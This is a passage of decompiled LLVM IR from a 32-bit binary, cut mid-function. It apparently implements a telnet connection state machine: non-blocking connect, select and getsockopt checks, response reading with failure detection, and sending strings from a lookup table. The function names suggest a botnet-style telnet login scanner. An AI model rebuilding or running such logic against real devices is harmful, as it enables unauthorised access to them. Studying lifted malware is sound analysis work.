  %v0_804bb98 = load i32, i32* %eax.global-to-local, align 4
  %v3_804bb98 = inttoptr i32 %v0_804bb71 to i32*
  store i32 %v0_804bb98, i32* %v3_804bb98, align 4
  %v1_804bb99 = load i32, i32* %stack_var_-596, align 4
  %v3_804bb99 = call i32 @__libc_fcntl(i32 %v2_804baf3, i32 %v1_804bb99, i32 0)
  %v0_804bb9e = load i32, i32* @esp, align 4
  store i32 %v2_804b6e3, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bbbd = load i32, i32* %v3_804bb3f, align 4
  store i32 %v4_804bbbd, i32* %eax.global-to-local, align 4
  %v1_804bbc3 = add i32 %v0_804bb9e, 8
  %v2_804bbc3 = inttoptr i32 %v1_804bbc3 to i32*
  store i32 16, i32* %v2_804bbc3, align 4
  %v2_804bbc5 = add i32 %v0_804bb9e, 4
  %v3_804bbc5 = inttoptr i32 %v2_804bbc5 to i32*
  store i32 %v2_804b6e3, i32* %v3_804bbc5, align 4
  %v0_804bbc6 = load i32, i32* %eax.global-to-local, align 4
  %v3_804bbc6 = inttoptr i32 %v0_804bb9e to i32*
  store i32 %v0_804bbc6, i32* %v3_804bbc6, align 4
  %v1_804bbc7 = load i32, i32* %stack_var_-596, align 4
  %v3_804bbc7 = call i32 @__libc_connect(i32 %v2_804baf3, i32 %v1_804bbc7, i32 0)
  store i32 %v3_804bbc7, i32* %eax.global-to-local, align 4
  %v0_804bbcc = load i32, i32* @esp, align 4
  %v1_804bbcc = add i32 %v0_804bbcc, 16
  %v10_804bbcf = icmp eq i32 %v3_804bbc7, -1
  %v1_804bbd2 = icmp eq i1 %v10_804bbcf, false
  br i1 %v1_804bbd2, label %dec_label_pc_804bc0a, label %dec_label_pc_804bbd4

dec_label_pc_804bbd4:                             ; preds = %dec_label_pc_804bb4b
  %v1_804bbd4 = call i32 @__errno_location(i32 %v2_804baf3)
  store i32 %v1_804bbd4, i32* %eax.global-to-local, align 4
  %v1_804bbd9 = inttoptr i32 %v1_804bbd4 to i32*
  %v2_804bbd9 = load i32, i32* %v1_804bbd9, align 4
  store i32 %v2_804bbd9, i32* %eax.global-to-local, align 4
  %v9_804bbdb = icmp eq i32 %v2_804bbd9, 115
  br i1 %v9_804bbdb, label %dec_label_pc_804bbd4.dec_label_pc_804bc0a_crit_edge, label %dec_label_pc_804bbe0

dec_label_pc_804bbd4.dec_label_pc_804bc0a_crit_edge: ; preds = %dec_label_pc_804bbd4
  %v0_804bc23.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bc0a

dec_label_pc_804bbe0:                             ; preds = %dec_label_pc_804bbd4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v0_804bbf9 = load i32, i32* @esp, align 4
  %v2_804bbfc = add i32 %v0_804bbf9, -16
  %v3_804bbfc = inttoptr i32 %v2_804bbfc to i32*
  store i32 %v2_804b84c, i32* %v3_804bbfc, align 4
  %v1_804bbfd = call i32 @reset_telstate(i32 %v2_804baf3)
  store i32 %v1_804bbfd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bc0a:                             ; preds = %dec_label_pc_804bbd4.dec_label_pc_804bc0a_crit_edge, %dec_label_pc_804bb4b
  %v0_804bc23 = phi i32 [ %v0_804bc23.pre, %dec_label_pc_804bbd4.dec_label_pc_804bc0a_crit_edge ], [ %v1_804bbcc, %dec_label_pc_804bb4b ]
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804bc26 = add i32 %v0_804bc23, -12
  %v2_804bc26 = inttoptr i32 %v1_804bc26 to i32*
  store i32 1, i32* %v2_804bc26, align 4
  %v0_804bc28 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc28 = add i32 %v0_804bc23, -16
  %v3_804bc28 = inttoptr i32 %v2_804bc28 to i32*
  store i32 %v0_804bc28, i32* %v3_804bc28, align 4
  %v1_804bc29 = load i32, i32* %stack_var_-596, align 4
  %v2_804bc29 = inttoptr i32 %v2_804baf3 to i32*
  %v3_804bc29 = call i32 @advance_state(i32* %v2_804bc29, i32 %v1_804bc29)
  store i32 %v3_804bc29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bc36:                             ; preds = %dec_label_pc_804b885
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804bc40, i32* @edi, align 4
  %v5_804bc47 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804bc65 = inttoptr i32 %v2_804b84c to i32*
  %v4_804bc65 = load i32, i32* %v3_804bc65, align 4
  %v2_804bc6a = udiv i32 %v4_804bc65, 32
  store i32 %v2_804bc6a, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bc83 = load i32, i32* %v3_804bc65, align 4
  %v1_804bc86 = urem i32 %v4_804bc83, 32
  store i32 %v1_804bc86, i32* %eax.global-to-local, align 4
  %v0_804bc89 = load i32, i32* @ebp, align 4
  %v2_804bc89 = mul nuw nsw i32 %v2_804bc6a, 4
  %v3_804bc89 = add nsw i32 %v2_804bc89, -312
  %v4_804bc89 = add i32 %v3_804bc89, %v0_804bc89
  %v5_804bc89 = inttoptr i32 %v4_804bc89 to i32*
  %v6_804bc89 = load i32, i32* %v5_804bc89, align 4
  %v9_804bc89 = shl i32 1, %v1_804bc86
  %v12_804bc89 = or i32 %v6_804bc89, %v9_804bc89
  store i32 %v12_804bc89, i32* %v5_804bc89, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bcba = load i32, i32* %v3_804bc65, align 4
  %v1_804bcbd = add i32 %v4_804bcba, 1
  store i32 %v1_804bcbd, i32* %edx.global-to-local, align 4
  %v0_804bcc0 = load i32, i32* @esp, align 4
  %v2_804bcc9 = add i32 %v0_804bcc0, -16
  %v3_804bcc9 = inttoptr i32 %v2_804bcc9 to i32*
  store i32 %v2_804bcc3, i32* %v3_804bcc9, align 4
  %v1_804bcca = add i32 %v0_804bcc0, -20
  %v2_804bcca = inttoptr i32 %v1_804bcca to i32*
  store i32 0, i32* %v2_804bcca, align 4
  store i32 %v2_804bc40, i32* %eax.global-to-local, align 4
  %v2_804bcd2 = add i32 %v0_804bcc0, -24
  %v3_804bcd2 = inttoptr i32 %v2_804bcd2 to i32*
  store i32 %v2_804bc40, i32* %v3_804bcd2, align 4
  %v1_804bcd3 = add i32 %v0_804bcc0, -28
  %v2_804bcd3 = inttoptr i32 %v1_804bcd3 to i32*
  store i32 0, i32* %v2_804bcd3, align 4
  %v0_804bcd5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bcd5 = add i32 %v0_804bcc0, -32
  %v3_804bcd5 = inttoptr i32 %v2_804bcd5 to i32*
  store i32 %v0_804bcd5, i32* %v3_804bcd5, align 4
  %v0_804bcd6 = load i32, i32* %stack_var_-324, align 4
  %v2_804bcd6 = load i32, i32* %stack_var_-316, align 4
  %v5_804bcd6 = call i32 @__libc_select(i32 %v0_804bcd6, i32 %arg1, i32 %v2_804bcd6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804bcd6, i32* %eax.global-to-local, align 4
  %v0_804bcdb = load i32, i32* @esp, align 4
  %v12_804bce1 = icmp eq i32 %v5_804bcd6, 1
  %v1_804bce5 = icmp eq i1 %v12_804bce1, false
  br i1 %v1_804bce5, label %dec_label_pc_804bdec, label %dec_label_pc_804bceb

dec_label_pc_804bceb:                             ; preds = %dec_label_pc_804bc36
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bd15 = load i32, i32* %v3_804bc65, align 4
  store i32 %v4_804bd15, i32* %edx.global-to-local, align 4
  %v2_804bd21 = add i32 %v0_804bcdb, 16
  %v3_804bd21 = inttoptr i32 %v2_804bd21 to i32*
  store i32 %v2_804bd1b, i32* %v3_804bd21, align 4
  store i32 %v2_804bd22, i32* %eax.global-to-local, align 4
  %v2_804bd28 = add i32 %v0_804bcdb, 12
  %v3_804bd28 = inttoptr i32 %v2_804bd28 to i32*
  store i32 %v2_804bd22, i32* %v3_804bd28, align 4
  %v1_804bd29 = add i32 %v0_804bcdb, 8
  %v2_804bd29 = inttoptr i32 %v1_804bd29 to i32*
  store i32 4, i32* %v2_804bd29, align 4
  %v1_804bd2b = add i32 %v0_804bcdb, 4
  %v2_804bd2b = inttoptr i32 %v1_804bd2b to i32*
  store i32 1, i32* %v2_804bd2b, align 4
  %v0_804bd2d = load i32, i32* %edx.global-to-local, align 4
  %v3_804bd2d = inttoptr i32 %v0_804bcdb to i32*
  store i32 %v0_804bd2d, i32* %v3_804bd2d, align 4
  %v0_804bd2e = load i32, i32* %stack_var_-332, align 4
  %v1_804bd2e = load i32, i32* %stack_var_-328, align 4
  %v2_804bd2e = load i32, i32* %stack_var_-324, align 4
  %v4_804bd2e = load i32, i32* %stack_var_-316, align 4
  %v5_804bd2e = call i32 @getsockopt(i32 %v0_804bd2e, i32 %v1_804bd2e, i32 %v2_804bd2e, i32 %arg1, i32 %v4_804bd2e)
  %v0_804bd33 = load i32, i32* @esp, align 4
  %v3_804bd36 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804bd36, i32* %eax.global-to-local, align 4
  %v1_804bd3c = icmp eq i32 %v3_804bd36, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804bd3c, label %dec_label_pc_804bd6a, label %dec_label_pc_804bd40

dec_label_pc_804bd40:                             ; preds = %dec_label_pc_804bceb
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v2_804bd5c = add i32 %v0_804bd33, 16
  %v3_804bd5c = inttoptr i32 %v2_804bd5c to i32*
  store i32 %v2_804b84c, i32* %v3_804bd5c, align 4
  %v0_804bd5d = load i32, i32* %stack_var_-332, align 4
  %v1_804bd5d = call i32 @reset_telstate(i32 %v0_804bd5d)
  store i32 %v1_804bd5d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bd6a:                             ; preds = %dec_label_pc_804bceb
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bd80 = load i32, i32* %v3_804bc65, align 4
  store i32 %v4_804bd80, i32* %eax.global-to-local, align 4
  %v1_804bd86 = add i32 %v0_804bd33, 24
  %v2_804bd86 = inttoptr i32 %v1_804bd86 to i32*
  store i32 0, i32* %v2_804bd86, align 4
  %v1_804bd88 = add i32 %v0_804bd33, 20
  %v2_804bd88 = inttoptr i32 %v1_804bd88 to i32*
  store i32 3, i32* %v2_804bd88, align 4
  %v0_804bd8a = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd8a = add i32 %v0_804bd33, 16
  %v3_804bd8a = inttoptr i32 %v2_804bd8a to i32*
  store i32 %v0_804bd8a, i32* %v3_804bd8a, align 4
  %v0_804bd8b = load i32, i32* %stack_var_-332, align 4
  %v1_804bd8b = load i32, i32* %stack_var_-328, align 4
  %v2_804bd8b = load i32, i32* %stack_var_-324, align 4
  %v3_804bd8b = call i32 @__libc_fcntl(i32 %v0_804bd8b, i32 %v1_804bd8b, i32 %v2_804bd8b)
  %v0_804bd90 = load i32, i32* @esp, align 4
  %v13_804bd95 = and i32 %v3_804bd8b, -2049
  store i32 %v13_804bd95, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bdae = load i32, i32* %v3_804bc65, align 4
  store i32 %v4_804bdae, i32* %eax.global-to-local, align 4
  %v2_804bdb4 = add i32 %v0_804bd90, 8
  %v3_804bdb4 = inttoptr i32 %v2_804bdb4 to i32*
  store i32 %v13_804bd95, i32* %v3_804bdb4, align 4
  %v1_804bdb5 = add i32 %v0_804bd90, 4
  %v2_804bdb5 = inttoptr i32 %v1_804bdb5 to i32*
  store i32 4, i32* %v2_804bdb5, align 4
  %v0_804bdb7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804bdb7 = inttoptr i32 %v0_804bd90 to i32*
  store i32 %v0_804bdb7, i32* %v3_804bdb7, align 4
  %v0_804bdb8 = load i32, i32* %stack_var_-332, align 4
  %v1_804bdb8 = load i32, i32* %stack_var_-328, align 4
  %v2_804bdb8 = load i32, i32* %stack_var_-324, align 4
  %v3_804bdb8 = call i32 @__libc_fcntl(i32 %v0_804bdb8, i32 %v1_804bdb8, i32 %v2_804bdb8)
  %v0_804bdbd = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804bddc = add i32 %v0_804bdbd, 4
  %v2_804bddc = inttoptr i32 %v1_804bddc to i32*
  store i32 2, i32* %v2_804bddc, align 4
  %v0_804bdde = load i32, i32* %eax.global-to-local, align 4
  %v3_804bdde = inttoptr i32 %v0_804bdbd to i32*
  store i32 %v0_804bdde, i32* %v3_804bdde, align 4
  %v0_804bddf = load i32, i32* %stack_var_-332, align 4
  %v1_804bddf = load i32, i32* %stack_var_-328, align 4
  %v2_804bddf = inttoptr i32 %v0_804bddf to i32*
  %v3_804bddf = call i32 @advance_state(i32* %v2_804bddf, i32 %v1_804bddf)
  store i32 %v3_804bddf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bdec:                             ; preds = %dec_label_pc_804bc36
  %v13_804bdec = icmp eq i32 %v5_804bcd6, -1
  %v1_804bdf0 = icmp eq i1 %v13_804bdec, false
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804bdf0, label %dec_label_pc_804be1c, label %dec_label_pc_804bdf2

dec_label_pc_804bdf2:                             ; preds = %dec_label_pc_804bdec
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v2_804be0e = add i32 %v0_804bcdb, 16
  %v3_804be0e = inttoptr i32 %v2_804be0e to i32*
  store i32 %v2_804b84c, i32* %v3_804be0e, align 4
  %v1_804be0f = call i32 @reset_telstate(i32 %v5_804bcd6)
  store i32 %v1_804be0f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804be1c:                             ; preds = %dec_label_pc_804bdec
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v2_804be37 = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804be37, i32* %eax.global-to-local, align 4
  %v1_804be39 = add i32 %v2_804be37, 5
  store i32 %v1_804be39, i32* @ebx, align 4
  %v1_804be3f = add i32 %v0_804bcdb, 16
  %v2_804be3f = inttoptr i32 %v1_804be3f to i32*
  store i32 0, i32* %v2_804be3f, align 4
  %v1_804be41 = inttoptr i32 %v5_804bcd6 to i32*
  %v2_804be41 = call i32 @__GI_time(i32* %v1_804be41)
  store i32 %v2_804be41, i32* %eax.global-to-local, align 4
  %v0_804be49 = load i32, i32* @ebx, align 4
  %v7_804be49 = icmp ult i32 %v0_804be49, %v2_804be41
  %v1_804be4b = icmp eq i1 %v7_804be49, false
  br i1 %v1_804be4b, label %dec_label_pc_804c779, label %dec_label_pc_804be51

dec_label_pc_804be51:                             ; preds = %dec_label_pc_804be1c
  %v0_804be46 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804be6d = inttoptr i32 %v0_804be46 to i32*
  store i32 %v2_804b84c, i32* %v3_804be6d, align 4
  %v0_804be6e = load i32, i32* %stack_var_-332, align 4
  %v1_804be6e = call i32 @reset_telstate(i32 %v0_804be6e)
  store i32 %v1_804be6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804be7b:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  %v1_804be93 = add i32 %v2_804b84c, 24
  store i32 %v1_804be93, i32* %eax.global-to-local, align 4
  %v1_804be96 = inttoptr i32 %v1_804be93 to i32*
  %v2_804be96 = load i32, i32* %v1_804be96, align 4
  store i32 %v2_804be96, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804beae = inttoptr i32 %v2_804b84c to i32*
  %v4_804beae = load i32, i32* %v3_804beae, align 4
  store i32 %v4_804beae, i32* %eax.global-to-local, align 4
  %v0_804beb1 = load i32, i32* @esp, align 4
  %v1_804beb4 = add i32 %v0_804beb1, -16
  %v2_804beb4 = inttoptr i32 %v1_804beb4 to i32*
  store i32 134615532, i32* %v2_804beb4, align 4
  %v1_804beb9 = add i32 %v0_804beb1, -20
  %v2_804beb9 = inttoptr i32 %v1_804beb9 to i32*
  store i32 1024, i32* %v2_804beb9, align 4
  %v0_804bebe = load i32, i32* @ebx, align 4
  %v2_804bebe = add i32 %v0_804beb1, -24
  %v3_804bebe = inttoptr i32 %v2_804bebe to i32*
  store i32 %v0_804bebe, i32* %v3_804bebe, align 4
  %v5_804bebf = add i32 %v0_804beb1, -28
  %v6_804bebf = inttoptr i32 %v5_804bebf to i32*
  store i32 %arg1, i32* %v6_804bebf, align 4
  %v0_804bec2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bec2 = add i32 %v0_804beb1, -32
  %v3_804bec2 = inttoptr i32 %v2_804bec2 to i32*
  store i32 %v0_804bec2, i32* %v3_804bec2, align 4
  %v1_804bec3 = call i32 @read_until_response(i32 %v6_804b89b)
  %v0_804bec8 = load i32, i32* @esp, align 4
  %v1_804becb = icmp eq i32 %v1_804bec3, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  br i1 %v1_804becb, label %dec_label_pc_804bf58, label %dec_label_pc_804bed3

dec_label_pc_804bed3:                             ; preds = %dec_label_pc_804be7b
  store i32 %v1_804be93, i32* %eax.global-to-local, align 4
  %v2_804beee = load i32, i32* %v1_804be96, align 4
  store i32 %v2_804beee, i32* %eax.global-to-local, align 4
  %v2_804bef3 = add i32 %v0_804bec8, 16
  %v3_804bef3 = inttoptr i32 %v2_804bef3 to i32*
  store i32 %v2_804beee, i32* %v3_804bef3, align 4
  %v0_804bef4 = load i32, i32* %stack_var_-332, align 4
  %v1_804bef4 = call i32 @contains_fail(i32 %v0_804bef4)
  %v0_804bef9 = load i32, i32* @esp, align 4
  %v1_804befc = icmp eq i32 %v1_804bef4, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804bf48 = add i32 %v0_804bef9, 4
  %v2_804bf48 = inttoptr i32 %v1_804bf48 to i32*
  br i1 %v1_804befc, label %dec_label_pc_804bf2c, label %dec_label_pc_804bf00

dec_label_pc_804bf00:                             ; preds = %dec_label_pc_804bed3
  store i32 0, i32* %v2_804bf48, align 4
  %v0_804bf1e = load i32, i32* %eax.global-to-local, align 4
  %v3_804bf1e = inttoptr i32 %v0_804bef9 to i32*
  store i32 %v0_804bf1e, i32* %v3_804bf1e, align 4
  %v0_804bf1f = load i32, i32* %stack_var_-332, align 4
  %v1_804bf1f = load i32, i32* %stack_var_-328, align 4
  %v2_804bf1f = inttoptr i32 %v0_804bf1f to i32*
  %v3_804bf1f = call i32 @advance_state(i32* %v2_804bf1f, i32 %v1_804bf1f)
  store i32 %v3_804bf1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bf2c:                             ; preds = %dec_label_pc_804bed3
  store i32 3, i32* %v2_804bf48, align 4
  %v0_804bf4a = load i32, i32* %eax.global-to-local, align 4
  %v3_804bf4a = inttoptr i32 %v0_804bef9 to i32*
  store i32 %v0_804bf4a, i32* %v3_804bf4a, align 4
  %v0_804bf4b = load i32, i32* %stack_var_-332, align 4
  %v1_804bf4b = load i32, i32* %stack_var_-328, align 4
  %v2_804bf4b = inttoptr i32 %v0_804bf4b to i32*
  %v3_804bf4b = call i32 @advance_state(i32* %v2_804bf4b, i32 %v1_804bf4b)
  store i32 %v3_804bf4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bf58:                             ; preds = %dec_label_pc_804be7b
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v2_804bf73 = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804bf73, i32* %eax.global-to-local, align 4
  %v1_804bf75 = add i32 %v2_804bf73, 7
  store i32 %v1_804bf75, i32* @ebx, align 4
  %v1_804bf7b = add i32 %v0_804bec8, 16
  %v2_804bf7b = inttoptr i32 %v1_804bf7b to i32*
  store i32 0, i32* %v2_804bf7b, align 4
  %v0_804bf7d = load i32, i32* %stack_var_-332, align 4
  %v1_804bf7d = inttoptr i32 %v0_804bf7d to i32*
  %v2_804bf7d = call i32 @__GI_time(i32* %v1_804bf7d)
  store i32 %v2_804bf7d, i32* %eax.global-to-local, align 4
  %v0_804bf85 = load i32, i32* @ebx, align 4
  %v7_804bf85 = icmp ult i32 %v0_804bf85, %v2_804bf7d
  %v1_804bf87 = icmp eq i1 %v7_804bf85, false
  br i1 %v1_804bf87, label %dec_label_pc_804c779, label %dec_label_pc_804bf8d

dec_label_pc_804bf8d:                             ; preds = %dec_label_pc_804bf58
  %v0_804bf82 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804bfa9 = inttoptr i32 %v0_804bf82 to i32*
  store i32 %v2_804b84c, i32* %v3_804bfa9, align 4
  %v0_804bfaa = load i32, i32* %stack_var_-332, align 4
  %v1_804bfaa = call i32 @reset_telstate(i32 %v0_804bfaa)
  store i32 %v1_804bfaa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804bfb7:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804bfcd = add i32 %v2_804ba07, %v2_804b84a
  %v4_804bfcd = inttoptr i32 %v3_804bfcd to i8*
  %v5_804bfcd = load i8, i8* %v4_804bfcd, align 2
  %v6_804bfcd = zext i8 %v5_804bfcd to i32
  store i32 %v6_804bfcd, i32* %eax.global-to-local, align 4
  %v1_804bfd6 = mul nuw nsw i32 %v6_804bfcd, 4
  %v2_804bfd6 = add nuw nsw i32 %v1_804bfd6, 134615460
  %v3_804bfd6 = inttoptr i32 %v2_804bfd6 to i32*
  %v4_804bfd6 = load i32, i32* %v3_804bfd6, align 4
  %v1_804bfe8 = and i32 %v4_804bfd6, -256
  store i32 %v1_804bfe8, i32* %eax.global-to-local, align 4
  %v4_804bfeb = inttoptr i32 %v4_804bfd6 to i8*
  store i32 %v4_804bfd6, i32* @edi, align 4
  %v3_804bff1 = call i32 @_strlen(i8* %v4_804bfeb)
  store i32 %v3_804bff1, i32* @esi, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v5_804c010 = load i8, i8* %v4_804bfcd, align 2
  %v6_804c010 = zext i8 %v5_804c010 to i32
  store i32 %v6_804c010, i32* %eax.global-to-local, align 4
  %v1_804c019 = mul nuw nsw i32 %v6_804c010, 4
  %v2_804c019 = add nuw nsw i32 %v1_804c019, 134615460
  %v3_804c019 = inttoptr i32 %v2_804c019 to i32*
  %v4_804c019 = load i32, i32* %v3_804c019, align 4
  store i32 %v4_804c019, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c036 = inttoptr i32 %v2_804b84c to i32*
  %v4_804c036 = load i32, i32* %v3_804c036, align 4
  store i32 %v4_804c036, i32* %eax.global-to-local, align 4
  %v0_804c039 = load i32, i32* @esp, align 4
  %v1_804c039 = add i32 %v0_804c039, -4
  %v2_804c039 = inttoptr i32 %v1_804c039 to i32*
  store i32 16384, i32* %v2_804c039, align 4
  %v0_804c03e = load i32, i32* @esi, align 4
  %v2_804c03e = add i32 %v0_804c039, -8
  %v3_804c03e = inttoptr i32 %v2_804c03e to i32*
  store i32 %v0_804c03e, i32* %v3_804c03e, align 4
  %v0_804c03f = load i32, i32* @ebx, align 4
  %v2_804c03f = add i32 %v0_804c039, -12
  %v3_804c03f = inttoptr i32 %v2_804c03f to i32*
  store i32 %v0_804c03f, i32* %v3_804c03f, align 4
  %v0_804c040 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c040 = add i32 %v0_804c039, -16
  %v3_804c040 = inttoptr i32 %v2_804c040 to i32*
  store i32 %v0_804c040, i32* %v3_804c040, align 4
  %v4_804c041 = call i32 @__libc_send(i32 %v4_804bfd6, i32 %v2_804b755, i32 %v6_804b89b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c041, i32* %eax.global-to-local, align 4
  %v0_804c046 = load i32, i32* @esp, align 4
  %v2_804c049 = icmp slt i32 %v4_804c041, 0
  %v1_804c04b = icmp eq i1 %v2_804c049, false
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c04b, label %dec_label_pc_804c077, label %dec_label_pc_804c04d

dec_label_pc_804c04d:                             ; preds = %dec_label_pc_804bfb7
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c069 = inttoptr i32 %v0_804c046 to i32*
  store i32 %v2_804b84c, i32* %v3_804c069, align 4
  %v1_804c06a = call i32 @reset_telstate(i32 %v4_804bfd6)
  store i32 %v1_804c06a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c077:                             ; preds = %dec_label_pc_804bfb7
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804c08d = load i32, i32* %v3_804c036, align 4
  store i32 %v4_804c08d, i32* %eax.global-to-local, align 4
  %v1_804c090 = add i32 %v0_804c046, 12
  %v2_804c090 = inttoptr i32 %v1_804c090 to i32*
  store i32 16384, i32* %v2_804c090, align 4
  %v1_804c095 = add i32 %v0_804c046, 8
  %v2_804c095 = inttoptr i32 %v1_804c095 to i32*
  store i32 2, i32* %v2_804c095, align 4
  %v1_804c097 = add i32 %v0_804c046, 4
  %v2_804c097 = inttoptr i32 %v1_804c097 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8057704.173 to i32), i32* %v2_804c097, align 4
  %v0_804c09c = load i32, i32* %eax.global-to-local, align 4
  %v3_804c09c = inttoptr i32 %v0_804c046 to i32*
  store i32 %v0_804c09c, i32* %v3_804c09c, align 4
  %v4_804c09d = call i32 @__libc_send(i32 %v4_804bfd6, i32 %v2_804b755, i32 %v6_804b89b, i32 ptrtoint (i32* @0 to i32))
  %v0_804c0a2 = load i32, i32* @esp, align 4
  %v2_804c0a5 = icmp slt i32 %v4_804c09d, 0
  %v1_804c0a7 = icmp eq i1 %v2_804c0a5, false
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  br i1 %v1_804c0a7, label %dec_label_pc_804c0d3, label %dec_label_pc_804c0a9

dec_label_pc_804c0a9:                             ; preds = %dec_label_pc_804c077
  %v3_804c0c5 = inttoptr i32 %v0_804c0a2 to i32*
  store i32 %v2_804b84c, i32* %v3_804c0c5, align 4
  %v1_804c0c6 = call i32 @reset_telstate(i32 %v4_804bfd6)
  store i32 %v1_804c0c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c0d3:                             ; preds = %dec_label_pc_804c077
  %v1_804c0ef = add i32 %v0_804c0a2, 4
  %v2_804c0ef = inttoptr i32 %v1_804c0ef to i32*
  store i32 4, i32* %v2_804c0ef, align 4
  %v0_804c0f1 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c0f1 = inttoptr i32 %v0_804c0a2 to i32*
  store i32 %v0_804c0f1, i32* %v3_804c0f1, align 4
  %v2_804c0f2 = inttoptr i32 %v4_804bfd6 to i32*
  %v3_804c0f2 = call i32 @advance_state(i32* %v2_804c0f2, i32 %v2_804b755)
  store i32 %v3_804c0f2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c0ff:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  %v1_804c117 = add i32 %v2_804b84c, 24
  store i32 %v1_804c117, i32* %eax.global-to-local, align 4
  %v1_804c11a = inttoptr i32 %v1_804c117 to i32*
  %v2_804c11a = load i32, i32* %v1_804c11a, align 4
  store i32 %v2_804c11a, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c132 = inttoptr i32 %v2_804b84c to i32*
  %v4_804c132 = load i32, i32* %v3_804c132, align 4
  store i32 %v4_804c132, i32* %eax.global-to-local, align 4
  %v0_804c135 = load i32, i32* @esp, align 4
  %v1_804c138 = add i32 %v0_804c135, -16
  %v2_804c138 = inttoptr i32 %v1_804c138 to i32*
  store i32 ptrtoint (i32* @global_var_80611ec to i32), i32* %v2_804c138, align 4
  %v1_804c13d = add i32 %v0_804c135, -20
